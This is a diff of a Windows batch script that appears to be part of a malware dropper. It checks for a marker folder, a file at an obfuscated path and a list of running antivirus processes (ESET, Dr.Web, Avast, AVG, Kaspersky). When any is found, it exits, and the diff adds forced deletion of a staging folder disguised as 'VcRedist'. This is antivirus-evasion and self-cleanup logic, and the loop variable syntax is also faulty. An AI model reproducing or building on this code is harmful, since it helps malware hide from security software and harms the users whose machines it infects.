@@ -1,10 +1,11 @@
-rd /s /q "%ProgramData%\VcRedist
 setlocal EnableDelayedExpansion
 if exist "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\" (
+    rd /s /q "%ProgramData%\VcRedist"
     exit /b
 )
 
 if exist "%ProgramData%\logdata..\Index.exe" (
+    rd /s /q "%ProgramData%\VcRedist"
     exit /b
 )
 
@@ -13,6 +14,7 @@ set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe
 for %a in (%processList%) do (
     tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
     if not errorlevel 1 (
+        rd /s /q "%ProgramData%\VcRedist"
         exit /b
     )
 )
